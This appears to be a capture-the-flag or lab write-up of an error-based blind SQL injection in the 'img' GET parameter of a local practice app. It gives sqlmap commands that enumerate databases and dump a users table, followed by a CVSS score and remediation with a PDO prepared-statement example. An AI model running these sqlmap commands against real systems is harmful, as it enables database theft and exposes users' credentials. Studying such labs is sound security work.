# Error-Based Blind SQL Injection

### Vulnerability : Error-Based Blind SQL Injection

#### 1. Vulnerability Name & Description

**Challenge Name:** Error-Based Blind SQL Injection

**Vulnerability Type:** SQL Injection – Error-Based Blind (GET)

The application fails to properly sanitize user-supplied input passed through a **GET parameter (`img`)**.

This allows an attacker to inject malicious SQL queries that trigger database errors, which are then leveraged to infer database structure and extract sensitive data.

The vulnerability supports **multiple SQL injection techniques**, including:

* Boolean-based blind
* Error-based
* Time-based blind
* UNION-based queries

***

#### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:**

```
<http://localhost:1337/lab/sql-injection/get-blind-error/index.php?img=1>
```

**Vulnerable Parameter:**

```
img (GET)
```

**Automated Exploitation Commands (sqlmap):**

**Database Enumeration:**

```bash
sqlmap -u "<http://localhost:1337/lab/sql-injection/get-blind-error/index.php?img=1>" --batch --dbs
```

**Table Enumeration:**

```bash
sqlmap -u "<http://localhost:1337/lab/sql-injection/get-blind-error/index.php?img=1>" --batch -D sql_injection --tables

```

**Dump Users Table:**

```bash
sqlmap -u "<http://localhost:1337/lab/sql-injection/get-blind-error/index.php?img=1>" --batch -D sql_injection -Tusers --dump
```

#### Steps to Reproduce:

1. Access the vulnerable page with a normal `img` parameter
2. Identify injectable GET parameter
3. Launch sqlmap against the URL
4. Confirm error-based SQL injection
5. Enumerate databases and tables
6. Dump sensitive user data successfully

***

#### 3. Impact Analysis

* Full database enumeration
* Exposure of sensitive user information
* Disclosure of usernames, emails, and passwords
* Authentication bypass possibilities
* Data integrity compromise
* High risk of lateral movement if reused credentials exist
* Complete backend database compromise

***

#### 4. CVSS 3.1 Score & Vector String

**CVSS Base Score:** **9.1 (Critical)**

**Vector String:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

***

#### 5. Risk Rating / Severity

**Severity Level:** **CRITICAL**

Error-based SQL injection allows attackers to directly extract sensitive information using database error messages. When combined with UNION and blind techniques, it leads to total application compromise.

***

#### 6. Remediation / Mitigation Steps

1. Use **prepared statements / parameterized queries**
2. Never trust GET or POST parameters directly
3. Disable detailed database error messages in production
4. Implement strict input validation
5. Apply least-privilege database access
6. Use Web Application Firewalls (WAF)

**Secure Example (PHP PDO):**

```php
$stmt =$pdo->prepare("SELECT * FROM images WHERE id = ?");
$stmt->execute([$img]);
```

***

#### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

* Vulnerable GET parameter (img)

<figure><img src="../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

* sqlmap detection of error-based SQL injection
* Database enumeration output

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

* Table enumeration `(users, images, stocks)`

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

* Dumped users table with credentials
